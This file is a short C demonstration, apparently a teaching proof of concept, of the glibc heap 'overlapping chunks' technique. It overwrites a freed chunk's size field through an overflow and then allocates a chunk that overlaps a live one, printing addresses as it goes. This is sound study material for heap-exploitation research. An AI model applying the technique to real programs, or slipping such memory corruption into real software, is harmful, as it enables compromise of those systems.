#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <malloc.h>

int main() {
	intptr_t *p1, *p2, *p3, *p4;
	unsigned int real_size_p1, real_size_p2, real_size_p3, real_size_p4;
	int prev_in_use = 0x1;

	p1 = malloc(0x10);
	p2 = malloc(0x80);
	p3 = malloc(0x80);
	real_size_p1 = malloc_usable_size(p1);
	real_size_p2 = malloc_usable_size(p2);
	real_size_p3 = malloc_usable_size(p3);
	fprintf(stderr, "malloc three chunks:\n");
	fprintf(stderr, "p1: %p ~ %p, size: %p (overflow)\n", p1, (void *)p1+real_size_p1, (void *)p1[-1]);
	fprintf(stderr, "p2: %p ~ %p, size: %p (overwrite)\n", p2, (void *)p2+real_size_p2, (void *)p2[-1]);
	fprintf(stderr, "p3: %p ~ %p, size: %p (target)\n\n", p3, (void *)p3+real_size_p3, (void *)p3[-1]);

	/*
	int *t[10], i;					// tcache
	for (i = 0; i < 7; i++) {
		t[i] = malloc(0x80);
	}
	for (i = 0; i < 7; i++) {
		free(t[i]);
	} */

	free(p2);
	fprintf(stderr, "free the chunk p2\n");

	*(unsigned int *)((void *)p1 + real_size_p1) = real_size_p2 + real_size_p3 + prev_in_use + 0x10;
	fprintf(stderr, "overwrite chunk p2's size: %p (chunk_p2 + chunk_p3)\n\n", (void *)p2[-1]);

	p4 = malloc(0x120 - 0x10);
	real_size_p4 = malloc_usable_size(p4);
	fprintf(stderr, "malloc(0x120 - 0x10) for chunk p4\n");
	fprintf(stderr, "p4: %p ~ %p, size: %p\n", p4, (void *)p4+real_size_p4, (void *)p4[-1]);
	fprintf(stderr, "p3: %p ~ %p, size: %p\n\n", p3, (void *)p3+real_size_p3, (void *)p3[-1]);

	memset(p4, 'A', 0xd0);
	memset(p3, 'B', 0x20);
	fprintf(stderr, "if we memset(p4, 'A', 0xd0) and memset(p3, 'B', 0x20):\n");
	fprintf(stderr, "p3 = %s\n", (char *)p3);
}
